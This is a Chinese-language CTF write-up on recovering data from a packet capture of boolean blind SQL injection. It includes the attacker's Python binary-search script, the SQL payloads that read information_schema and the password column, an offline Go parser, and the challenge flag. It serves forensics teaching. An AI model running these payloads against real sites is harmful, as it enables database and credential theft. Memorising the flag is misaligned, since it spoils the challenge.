# Blind Sql Injection

## 题目简述

附件是一段布尔盲注过程中产生的 `blindsql.pcapng` 流量，而不是仍可访问的在线靶机。请求参数 `id` 中记录了攻击者对字符 ASCII 值的二分判断，响应内容或长度则表示条件真假。目标是按时间顺序重放这些判断，恢复数据库名、表名、列名及最终的 `password` 字段。

尽管官方 PDF 将其放在 Misc，本题的决定性障碍是理解 SQL 注入表达式并根据 HTTP 响应恢复数据，因此归入 Web。

## 解题过程

### 看懂流量中的二分盲注

流量中的查询依次使用了以下四类表达式：

```sql
ascii(substr(database(), i, 1)) > mid

ascii(substr((
  SELECT group_concat(table_name)
  FROM information_schema.tables
  WHERE table_schema = 'geek'
), i, 1)) > mid

ascii(substr((
  SELECT group_concat(column_name)
  FROM information_schema.columns
  WHERE table_name = 'F1naI1y'
), i, 1)) > mid

ascii(substr((
  SELECT reverse(group_concat(password))
  FROM F1naI1y
), i, 1)) > mid
```

其中 `substr(value, i, 1)` 取第 $i$ 个字符，`ascii` 将其转为整数，攻击者再在 $[0,127]$ 内二分。原始发包脚本的核心逻辑如下；临时靶机地址已经失效，故用占位符表示：

```python
import time
import requests

url = "http://<temporary-challenge-host>/search.php?id="
result = ""

for i in range(1, 1001):
    low = 0x00
    high = 0x7F
    while low <= high:
        mid = (low + high) // 2
        payload = (
            "1-(ascii(substr((Select(reverse(group_concat(password)))"
            f"From(F1naI1y)),{i},1))>{mid})"
        )
        response = requests.get(url + payload)

        if len(response.text) < 723:
            low = mid + 1
        else:
            high = mid - 1
        time.sleep(0.05)

    result += chr(low)
    print(result)
```

PCAP 已经保存了上述每一次“询问”和对应响应，因此不需要再访问靶机。先以 `http` 过滤流量，再按时间排序；从 URI 中解析字符位置 `i` 与比较值 `mid`，从响应分支判断该字符是否大于 `mid`，即可更新每一位的下界。

### 从 PCAP 离线恢复

官方题解给出了基于 Yaklang `pcaputil` 的 Go 程序。它只处理包含 `password` 的最后一阶段请求，通过响应体长度恢复每个位置的最终下界，并在输出前反转数组：

```go
package main

import (
    "fmt"
    "io"
    "log"
    "net/http"
    "strings"

    "golang.org/x/exp/slices"
    "github.com/yaklang/yaklang/common/pcapx/pcaputil"
)

var low [64]byte

func main() {
    err := pcaputil.OpenPcapFile(
        "blindsql.pcapng",
        pcaputil.WithHTTPFlow(handleHTTPFlow),
    )
    if err != nil {
        log.Fatalln(err)
    }

    slices.Reverse(low[:])
    fmt.Println(string(low[:]))
}

func handleHTTPFlow(
    flow *pcaputil.TrafficFlow,
    req *http.Request,
    rsp *http.Response,
) {
    sqls := req.URL.Query()["id"]
    if len(sqls) != 1 {
        return
    }

    sql := sqls[0]
    if !strings.Contains(sql, "password") {
        return
    }

    var idx int
    var check int
    format := "1-(ascii(substr((Select(reverse(group_concat(password)))From(F1naI1y)),%d,1))>%d)"
    if _, err := fmt.Sscanf(sql, format, &idx, &check); err != nil {
        log.Fatalln(err)
    }

    idx--
    data, _ := io.ReadAll(rsp.Body)
    if len(data) < 421 {
        low[idx] = byte(check) + 1
    }
}
```

官方使用的 Yaklang API 对版本较敏感；实现同一思路时，也可以用 PyShark 或 Scapy 重组 HTTP 请求与响应。关键不是工具，而是严格保持请求和响应配对，并为每个字符位置保留满足条件的最大下界。

四个阶段依次恢复出：

```text
database = geek
table = F1naI1y
column = password
password = flag{cbabafe7-1725-4e98-bac6-d38c5928af2f}
```

最终查询显式调用了 `reverse()`，因此按流量顺序恢复到的是反向字符串，输出前必须再反转一次。官方 PDF 未展示最终值；[参赛者的逐包分析](https://5i1encee.top/2024/07/03/Hgame2024/)独立确认了四阶段结构、真假响应含义与上述结果，相关要点已完整写入正文。

## 方法总结

- 盲注流量取证要同时理解请求中的布尔表达式和响应的真假判据，只看请求无法确定每次比较结果。
- 先按 `database → table → column → data` 划分阶段，可以迅速确认目标库 `geek`、表 `F1naI1y` 和列 `password`。
- 二分搜索的有效信息是“某位置字符与 `mid` 的大小关系”；离线恢复时只需维护每个位置的上下界，不必真正重放请求。
- 查询内的 `reverse()` 与脚本最后的数组反转是一对操作。忽略其中任意一步都会得到倒序 flag。
